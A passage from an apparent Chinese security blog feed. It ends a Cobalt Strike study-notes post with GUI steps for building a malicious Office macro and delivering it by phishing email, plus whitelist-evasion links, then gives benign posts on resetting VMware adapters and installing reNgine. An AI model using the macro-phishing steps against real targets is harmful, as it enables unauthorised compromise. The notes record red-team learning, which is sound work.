id="Java-Applet"><a href="#Java-Applet" class="headerlink" title="Java Applet"></a>Java Applet</h3><p>接下来一起来看看 Cobalt Strike Java Applet 攻击，在 Cobalt Strike 的源码中内置了用于攻击 Java Applet 签名的 Applet 工具。</p><p>使用 Applet 工具的步骤如下：</p><p>1、到 <code>Help -&gt; Arsenal</code></p><p>2、如果需要的话就修改/混淆病毒文件 </p><p>3、使用代码签名证书进行签名</p><p>4、构建</p><p>5、使用 Applet Kit 加载脚本</p><p>大概在 2014 年 7 月，开始有人在钓鱼中使用宏攻击，在几年前，这是一种效果还很不错的攻击方式。</p><h2 id="3、应用白名单"><a href="#3、应用白名单" class="headerlink" title="3、应用白名单"></a>3、应用白名单</h2><p>站在防御者的角度，一个好的防御应该是列出只允许自己运行的应用程序白名单而不允许他人运行。对于攻击者则是使用白名单应用程序将代理放到内存中的方法来进行攻击，Java Applet 攻击就是这样做的。</p><p>一种攻击的方法是直接插入内存进行攻击。Java Applet、Office 宏、CS 下的 PowerShell 命令行都是这样做的。</p><p>一些白名单免杀的资料：</p><p><a href="https://twitter.com/subTee">https://twitter.com/subTee</a></p><p><a href="https://github.com/khr0x40sh/WhiteListEvasion">https://github.com/khr0x40sh/WhiteListEvasion</a></p><h3 id="白名单申请"><a href="#白名单申请" class="headerlink" title="白名单申请"></a>白名单申请</h3><p>Win + R 打开运行窗口，输入 <code>gpedit.msc</code> ，来到 <code>用户配置 -&gt; 管理模板 -&gt; 系统</code> 处，打开 <code>只允许指定的 Windows 程序</code></p><p>在打开的窗口中，勾选<code>已启用</code>，之后点击<code>显示</code>按钮，在其中写入白名单的程序名称后，点击两次确定之后即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="4、宏攻击"><a href="#4、宏攻击" class="headerlink" title="4、宏攻击"></a>4、宏攻击</h2><p>在 Cobalt Strike 客户端上，选择 <code>Packages --&gt; MS Office Macro</code>，指定一个监听器，点击 <code>Generate</code>，之后根据提示的步骤生成一个 Word 文档。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>大体的步骤如下：</p><p>1、打开 Microsoft Word 或者 Excel</p><p>2、来到 <code>视图 --&gt; 宏</code></p><p>3、任意填写一个宏的名称</p><p>4、宏的位置选择为当前文档</p><p>5、点击创建</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>6、在打开的编辑器中，删除掉原来的内容</p><p>7、点击 Cobalt Strike 上的 <code>Copy Macro</code> 按钮</p><p>8、将刚复制 Cobalt Strike 生成的内容粘贴到打开的编辑器中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>9、关闭编辑器</p><p>10、将文档保存为启用宏的文档，这里可以选择保存为 <code>启用宏的 Word 文档</code> 或者 <code>Word 97-2003 文档</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来使用钓鱼邮件等方式上传到靶机，当靶机运行该文档后启用宏内容即可上线。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>这里不得不吐槽一句，Microsoft Office 的东西安装是真的麻烦。</p></blockquote><p>在上面 2-8 步骤创建编辑宏内容的过程，也可以打开 <code>开发工具 --&gt; Visual Basic</code> 界面，这里推荐使用快捷键<code>Alt+F11</code>打开该界面。</p><p>之后编辑<code>ThisDocument</code> 模块，粘贴宏代码也可以达到上述 2-8 步的效果。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h1><p>自 4 月 19 日发布 Cobalt Strike 第一节笔记开始，已经过去了半年的时间，踩过了无数坑，解决了无数的坑。</p><p>感谢 Cobalt Strike 的作者 <code>Raphael Mudge</code> 的课程，感谢 UP <code>Hack 学习呀</code> 上传的中文翻译版本，感谢 <code>A-Team</code> 团队的 Cobalt Strike 4.0 中文翻译手册，感谢每篇笔记最后参考链接的作者们，感谢曾经帮助我解决所碰到问题的大佬们，谢谢你们。</p><p>最后，还有一点要注意的就是， <code>CS学习笔记</code>系列只是我个人在学习 Cobalt Strike 的过程中所做的笔记，建议不要当做教程看，因为其中我本身已经知道的知识点和感觉不重要知识点我是没有记录的。</p><p>将自己的笔记公开发出来的目的有二：一是便于自己遗忘时随时查找，这也是17年我建立这个公众号的主要目的；二是在笔记中我会记录一些坑的解决方法，如果你碰到和我一样的问题，或许我这小菜鸟写的笔记就能帮助到你。</p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></p><p><a href="https://payloads.online/tools/socat">https://payloads.online/tools/socat</a></p><p><a href="https://zhuanlan.zhihu.com/p/93718885">https://zhuanlan.zhihu.com/p/93718885</a></p><p><a href="https://www.anquanke.com/post/id/156299">https://www.anquanke.com/post/id/156299</a></p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></p><p><a href="https://my.oschina.net/u/4300698/blog/3382230">https://my.oschina.net/u/4300698/blog/3382230</a></p><p><a href="https://segmentfault.com/a/1190000019290085">https://segmentfault.com/a/1190000019290085</a></p><p><a href="https://www.cnblogs.com/cthon/p/9151467.html">https://www.cnblogs.com/cthon/p/9151467.html</a></p><p><a href="https://www.secpulse.com/archives/127186.html">https://www.secpulse.com/archives/127186.html</a></p><p><a href="https://www.freebuf.com/articles/web/231892.html">https://www.freebuf.com/articles/web/231892.html</a></p><p><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></p><p><a href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></p><p><a href="https://www.cnblogs.com/backlion/p/10616308.html">https://www.cnblogs.com/backlion/p/10616308.html</a></p><p><a href="https://blog.csdn.net/hnjztyx/article/details/52910478">https://blog.csdn.net/hnjztyx/article/details/52910478</a></p><p><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9">http://blog.leanote.com/post/snowming/62ec1132a2c9</a></p><p><a href="https://blog.csdn.net/pipisorry/article/details/52269785">https://blog.csdn.net/pipisorry/article/details/52269785</a></p><p><a href="https://blog.csdn.net/l1028386804/article/details/86675559">https://blog.csdn.net/l1028386804/article/details/86675559</a></p><p><a href="https://www.freebuf.com/company-information/167460.html">https://www.freebuf.com/company-information/167460.html</a></p><p><a href="https://blog.csdn.net/qq_34101364/article/details/108062913">https://blog.csdn.net/qq_34101364/article/details/108062913</a></p><p><a href="https://blog.csdn.net/github_35186068/article/details/80518681">https://blog.csdn.net/github_35186068/article/details/80518681</a></p><p><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/">https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/</a></p><p><a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></p><p><a href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/">https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</a></p><p><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/">https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/</a></p><p><a href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html">https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】电脑休眠后虚拟网卡地址变成169.254网段的解决方法</title>
      <link href="//201015-194551.html"/>
      <url>//201015-194551.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>一直以来会遇到一个问题，就是电脑在休眠后再次打开电脑，在使用虚拟机时网络老是会碰到问题，此时如果查看物理机上虚拟网卡的地址就会发现 IP 地址变成了 169.254.xxx.xxx 。</p><p>之所以会出现这个问题是因为 Windows 在网络不通的情况下，会自动配置一个169.254.xxx.xxx这个地址段的IP地址。</p><h1 id="0x01-常规解决方法"><a href="#0x01-常规解决方法" class="headerlink" title="0x01 常规解决方法"></a>0x01 常规解决方法</h1><p>在<code>控制面板 -&gt; 网络和 Internet -&gt; 网络共享中心</code>里找到<code>更改适配器设置</code>，然后再找到有问题的网卡，右击禁用再启用就可以了。</p><p>但是虚拟机的虚拟网卡往往会有多个，一个个禁用启用难免有些麻烦，而且整个步骤也是比较繁琐的，因此下面看一下使用批处理文件的方式。</p><h1 id="0x02-批处理文件"><a href="#0x02-批处理文件" class="headerlink" title="0x02 批处理文件"></a>0x02 批处理文件</h1><p>其实原理也很简单，直接禁用网卡再重启网卡即可，为了更加贴合使用，我在里面加入了注释、延时的功能。</p><p>将以下内容保存到本地，后缀重命名为 <code>.bat</code> 文件，双击执行就可以重启对应的网卡了。当然 bat 文件里的网卡名称要换成自己的网卡名称，比如我这里的是 <code>VMware Network Adapter VMnet1</code>等三个网卡。</p><pre class="line-numbers language-none"><code class="language-none">ipconfigrem &quot;禁用网卡 VMware Network Adapter VMnet1&quot;netsh interface set interface &quot;VMware Network Adapter VMnet1&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet1&quot;netsh interface set interface &quot;VMware Network Adapter VMnet1&quot; enabledrem &quot;禁用网卡 VMware Network Adapter VMnet3&quot;netsh interface set interface &quot;VMware Network Adapter VMnet3&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet3&quot;netsh interface set interface &quot;VMware Network Adapter VMnet3&quot; enabledrem &quot;禁用网卡 VMware Network Adapter VMnet7&quot;netsh interface set interface &quot;VMware Network Adapter VMnet7&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet7&quot;netsh interface set interface &quot;VMware Network Adapter VMnet7&quot; enabledipconfigchoice &#x2F;t 5 &#x2F;c YN &#x2F;d Y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>rem</code> 起到注释作用，<code>choice /t 5 /c YN /d Y</code> 起到延时5秒的作用，两次的 ifconfig 主要用来查看重启前后的网卡IP地址情况。</p><blockquote><p>参考链接：</p><p><a href="https://iknow.lenovo.com.cn/detail/dc_182859.html">https://iknow.lenovo.com.cn/detail/dc_182859.html</a></p><p><a href="https://blog.csdn.net/jk110333/article/details/41869053">https://blog.csdn.net/jk110333/article/details/41869053</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经验总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】关于 reNgine 自动化网络侦查框架的国内安装与报错的解决方法</title>
      <link href="//200920-142641.html"/>
      <url>//200920-142641.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-关于"><a href="#0x00-关于" class="headerlink" title="0x00 关于"></a>0x00 关于</h1><p>reNgine 是 <code>Yogesh Ojha</code> 写的一款自动化网络侦查框架，或者说是信息收集聚合工具，他的推特：<a href="https://twitter.com/ojhayogesh11">@ojhayogesh11</a></p><p>该工具集合了子域名扫描、目录扫描、端口扫描、CMS扫描等等，扫描结束后，还能在手机上通知你。</p><p>在平时渗透测试的过程中使用这个工具可以节约很多信息收集的时间，项目地址为：<a href="https://github.com/yogeshojha/reNgine">https://github.com/yogeshojha/reNgine</a></p><p>在去年年底的时候我写了一款被动信息收集聚合工具，已经放在了我的 GitHub 上，当时还打算写个 Web 页面，为此还特地去学了一下 Django。</p><p>当时设计的 Web 页面大概长这个样子，但最后因为自己实在太菜，Web 页面没能写下去，只写了命令行版的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-09-11_10-09-30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在今年年初又写了一款主动信息收集工具，但是效果不太理想，所以就没放在我的 GitHub 上。</p><p>直至今年7月份在逛推特的时候，偶然看到大佬分享的 reNgine 这款工具。打开这个项目一看，这不就是我理想中的信息收集聚合工具嘛，虽然目前使用起来还有不少的 bug ，但是整体上个人觉着已经很不错了，至少比自己写的不知道好了多少倍。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/86880620-92814300-c10a-11ea-9b27-627f43934221.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/86752434-f9482300-c05c-11ea-954b-b0f538c1ecef.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>在 FreeBuf 上也有其对应的中文介绍：<a href="https://www.freebuf.com/sectool/245292.html">https://www.freebuf.com/sectool/245292.html</a></p></blockquote><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><p>需要有 docker、docker-compose、make 环境</p><h2 id="2、下载项目"><a href="#2、下载项目" class="headerlink" title="2、下载项目"></a>2、下载项目</h2><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;yogeshojha&#x2F;reNgine.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、开始安装"><a href="#3、开始安装" class="headerlink" title="3、开始安装"></a>3、开始安装</h2><pre class="line-numbers language-none"><code class="language-none">cd reNginemake certs#使用https访问，个人觉着可省略make build#构建项目make up#启动项目make username#创建登陆用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、更新"><a href="#4、更新" class="headerlink" title="4、更新"></a>4、更新</h2><pre class="line-numbers language-none"><code class="language-none">git pullmake buildmake up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看起来是非常的简单，但是对于在国内的我们来说，这其中包含了不少的坑。</p><h1 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h1><p>由于是老外写的东西，在这款工具安装过程中也引用下载了很多国外的文件，所以难免包含了一些被墙的东西。</p><p>最初在本地安装报错、安装报错这样过了几天之后就懒得整了，最后直接在国外的 vps 上去安装了，然后几分钟，真的就只要几分钟就安装好了。</p><p>但是一个月过去了、两个月过去了，随着国外 vps 的使用频率变低了，最后 vps 上最常使用的就是这个工具了，如果只是为了使用这个工具而去租个 vps ，实在觉着有些划不来。</p><p>于是又开始了在本地安装的折腾之旅，下面就来看看安装过程中的报错与解决方法。</p><h1 id="0x03-问题"><a href="#0x03-问题" class="headerlink" title="0x03 问题"></a>0x03 问题</h1><h2 id="1、下载安装很慢"><a href="#1、下载安装很慢" class="headerlink" title="1、下载安装很慢"></a>1、下载安装很慢</h2><p>一开始是以为 docker 下载慢的原因，所以试着给 docker 加代理，又或者给 docker-compose 加代理等等方法都不行。最后试了亿下后，意识到应该是 Dockers 容器里下载文件比较慢，之后修改了 reNgine 项目目录下的 Dockerfile 文件才解决了这个问题。</p><p>通过观察发现，在 build 的过程中，会访问默认系统镜像源下载安装文件，同时也会访问 pip 默认镜像源下载安装文件，因此我们只需要把这两个默认的镜像源替换成国内的就可以了。</p><p>打开 Dockerfile 文件，在第一个 <code>RUN</code> 命令前，加上以下命令。修改后，下面的命令在我这里是 Dockerfile 文件的第 13 行左右的样子。</p><pre class="line-numbers language-none"><code class="language-none">RUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.aliyun.com&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories \    &amp;&amp; mkdir ~&#x2F;.pip&#x2F; \    &amp;&amp; echo &#39;[global]&#39; &gt; ~&#x2F;.pip&#x2F;pip.conf \    &amp;&amp; echo &#39;index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;&#39; &gt;&gt; ~&#x2F;.pip&#x2F;pip.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面的命令在我理解就是把 Docker 容器中的 <code>/etc/apk/repositories</code> 文件里的 <code>dl-cdn.alpinelinux.org</code> 字符串替换成了 <code>mirrors.aliyun.com</code> ，以达到将系统默认镜像源替换成阿里云镜像源的目的。</p><p>之后创建 <code>~/.pip/pip.conf</code> 文件，并添加阿里云 pip 源，以达到替换 pip 源的目的。</p><p>当然如果有不喜欢阿里云源的同学可以换成其他家的源。</p><h2 id="2、go-get-被墙"><a href="#2、go-get-被墙" class="headerlink" title="2、go get 被墙"></a>2、go get 被墙</h2><p>在默认配置下，直接使用 <code>make build</code> ，我在进行到第 12 步的时候报了下面这个错误。</p><pre class="line-numbers language-none"><code class="language-none">Step 12&#x2F;24 : RUN go get -u github.com&#x2F;tomnomnom&#x2F;assetfinder github.com&#x2F;hakluke&#x2F;hakrawler github.com&#x2F;haccer&#x2F;subjack ---&gt; Running in e38c60f832f0package golang.org&#x2F;x&#x2F;net&#x2F;html: unrecognized import path &quot;golang.org&#x2F;x&#x2F;net&#x2F;html&quot; (https fetch: Get https:&#x2F;&#x2F;golang.org&#x2F;x&#x2F;net&#x2F;html?go-get&#x3D;1: dial tcp 216.239.37.1:443: connect: connection refused)package golang.org&#x2F;x&#x2F;net&#x2F;html&#x2F;charset: unrecognized import path &quot;golang.org&#x2F;x&#x2F;net&#x2F;html&#x2F;charset&quot; (https fetch: Get https:&#x2F;&#x2F;golang.org&#x2F;x&#x2F;net&#x2F;html&#x2F;charset?go-get&#x3D;1: dial tcp 216.239.37.1:443: connect: connection refused)package google.golang.org&#x2F;appengine&#x2F;urlfetch: unrecognized import path &quot;google.golang.org&#x2F;appengine&#x2F;urlfetch&quot; (https fetch: Get https:&#x2F;&#x2F;google.golang.org&#x2F;appengine&#x2F;urlfetch?go-get&#x3D;1: dial tcp 216.239.37.1:443: connect: connection refused)package golang.org&#x2F;x&#x2F;text&#x2F;encoding: unrecognized import path &quot;golang.org&#x2F;x&#x2F;text&#x2F;encoding&quot; (https fetch: Get https:&#x2F;&#x2F;golang.org&#x2F;x&#x2F;text&#x2F;encoding?go-get&#x3D;1: dial tcp 216.239.37.1:443: connect: connection refused)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后来去网站查了亿下，是因为在使用 <code>go get</code>命令获取资源会被墙的关系。知道了原因就好办了，我们只要加代理就行了。</p><p>在 reNgine 项目目录下的 Dockerfile 文件中找到 <code># Download Go packages</code> 这一行，在这一行的下面添加以下两条命令，此时 go get 就会去走代理，访问 <code>goproxy.io</code> 这个镜像下载资源了。</p><pre class="line-numbers language-none"><code class="language-none">ENV GO111MODULE&#x3D;onENV GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果发现 goproxy.io 无法访问，可以试试 gocenter.io 这个代理</p></blockquote><p>再次执行 <code>make build</code> ，就会发现第 12 步成功运行，但这还没完，报错依旧继续。</p><h2 id="3、安装-psycopg2-报错"><a href="#3、安装-psycopg2-报错" class="headerlink" title="3、安装 psycopg2 报错"></a>3、安装 psycopg2 报错</h2><p>在继续安装的过程中，又给我报了这些问题</p><pre class="line-numbers language-none"><code class="language-none">Building wheel for psycopg2 (setup.py): started  Building wheel for psycopg2 (setup.py): finished with status &#39;error&#39;  ERROR: Command errored out with exit status 1:   command: &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python -u -c &#39;import sys, setuptools, tokenize; sys.argv[0] &#x3D; &#39;&quot;&#39;&quot;&#39;&#x2F;tmp&#x2F;pip-install-eps_y188&#x2F;psycopg2&#x2F;setup.py&#39;&quot;&#39;&quot;&#39;; __file__&#x3D;&#39;&quot;&#39;&quot;&#39;&#x2F;tmp&#x2F;pip-install-eps_y188&#x2F;psycopg2&#x2F;setup.py&#39;&quot;&#39;&quot;&#39;;f&#x3D;getattr(tokenize, &#39;&quot;&#39;&quot;&#39;open&#39;&quot;&#39;&quot;&#39;, open)(__file__);code&#x3D;f.read().replace(&#39;&quot;&#39;&quot;&#39;\r\n&#39;&quot;&#39;&quot;&#39;, &#39;&quot;&#39;&quot;&#39;\n&#39;&quot;&#39;&quot;&#39;);f.close();exec(compile(code, __file__, &#39;&quot;&#39;&quot;&#39;exec&#39;&quot;&#39;&quot;&#39;))&#39; bdist_wheel -d &#x2F;tmp&#x2F;pip-wheel-fisuy49f       cwd: &#x2F;tmp&#x2F;pip-install-eps_y188&#x2F;psycopg2&#x2F;……Moving to &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;psycopg2&#x2F;   from &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;~sycopg2ERROR: Command errored out with exit status 1: &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python -u -c &#39;import sys, setuptools, tokenize; sys.argv[0] &#x3D; &#39;&quot;&#39;&quot;&#39;&#x2F;tmp&#x2F;pip-install-kwlcc4ta&#x2F;psycopg2&#x2F;setup.py&#39;&quot;&#39;&quot;&#39;; __file__&#x3D;&#39;&quot;&#39;&quot;&#39;&#x2F;tmp&#x2F;pip-install-kwlcc4ta&#x2F;psycopg2&#x2F;setup.py&#39;&quot;&#39;&quot;&#39;;f&#x3D;getattr(tokenize, &#39;&quot;&#39;&quot;&#39;open&#39;&quot;&#39;&quot;&#39;, open)(__file__);code&#x3D;f.read().replace(&#39;&quot;&#39;&quot;&#39;\r\n&#39;&quot;&#39;&quot;&#39;, &#39;&quot;&#39;&quot;&#39;\n&#39;&quot;&#39;&quot;&#39;);f.close();exec(compile(code, __file__, &#39;&quot;&#39;&quot;&#39;exec&#39;&quot;&#39;&quot;&#39;))&#39; install --record &#x2F;tmp&#x2F;pip-record-r7w9n2l8&#x2F;install-record.txt --single-version-externally-managed --compile --install-headers &#x2F;usr&#x2F;local&#x2F;include&#x2F;python3.8&#x2F;psycopg2 Check the logs for full command output.The command &#39;&#x2F;bin&#x2F;sh -c pip3 install -r &#x2F;tmp&#x2F;requirements.txt&#39; returned a non-zero code: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最初判断可能是因为源的问题，但是后来发现不管是默认的源还是国内源都会报错。</p><p>然后觉着可能还是和之前两个问题一样需要修改 Dockerfile 文件，但是在修改了无数次 Dockerfile 文件后发现都不行。</p><p>直到最后判断可能是版本问题，于是把 reNgine 目录下的 requirements.txt 文件里 psycopg2 后的版本号删除，再运行果然就可以了。</p><p>如果在 <code>pip install</code> 安装其他模块也报类似的错误时，也可以尝试删除 requirements.txt 文件的里版本号试试。不过这种操作可能会给后期带来一些不兼容的问题，但总强于安都安装不上的情况。</p><blockquote><p>在 pip 安装的过程中如果报错，可以再尝试几遍，因为有时仅仅可能是因为本地网络的原因。</p></blockquote><p>如果你碰到了除上面三个问题之外的其他问题，欢迎在下方留言。</p><h1 id="0x04-最后"><a href="#0x04-最后" class="headerlink" title="0x04 最后"></a>0x04 最后</h1><p>由于国内关于这款工具的安装说明少之又少，所以只能自己一步一步的去摸索，在经历了两天的报错—》排错—》报错……之后，终于安装好了这款工具。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-09-11_12-21-28.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>另外因为整个过程是我自己摸索出来的，因此难免中间存在有问题或者可以优化的地方，如有错误欢迎各位大佬指正。</p><blockquote><p>参考链接：</p><p><a href="https://www.liwenzhou.com/posts/Go/fix_go_get/">https://www.liwenzhou.com/posts/Go/fix_go_get/</a></p><p><a href="https://cloud.tencent.com/developer/article/1520882">https://cloud.tencent.com/developer/article/1520882</a></p><p> <a href="https://blog.csdn.net/u013360850/article/details/90602149">https://blog.csdn.net/u013360850/article/details/90602149</a></p><p> <a href="https://blog.csdn.net/xuezhangjun0121/article/details/81664260">https://blog.csdn.net/xuezhangjun0121/article/details/81664260</a></p><p> 更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具分享 </tag>
            
            <tag> 经验总结 </tag>
            
            <tag> reNgine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】Linux下使用HAProxy为多个代理设置负载均衡</title>
      <link href="//200705-013156.html"/>
      <url>//200705-013156.html</url>
      
